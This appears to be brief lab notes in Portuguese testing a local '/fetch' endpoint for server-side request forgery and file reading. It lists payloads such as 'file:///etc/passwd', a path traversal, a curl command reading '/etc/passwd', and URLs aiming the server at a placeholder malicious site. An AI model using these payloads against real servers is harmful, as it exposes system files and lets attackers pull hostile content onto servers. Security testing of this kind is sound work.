```
file:///etc/passwd
../etc/passwd
```

```
http://127.0.0.1:5000/fetch?url=file:///etc/passwd
```

```bash
curl http://127.0.0.1:5000/fetch?url=file:///etc/passwd
```

```
file:///app/requirements.txt
file:///app/text.txt
```

(não funciona)
Poderia ser feito algo como:
```http://127.0.0.1:5000/fetch?url=http://<malicious-site>.com```
```http://127.0.0.1:5000/fetch?url=http://<malicious-site>.com/malicious_file.txt```
(levando a um CSRF ou até execução de código malicioso no servidor)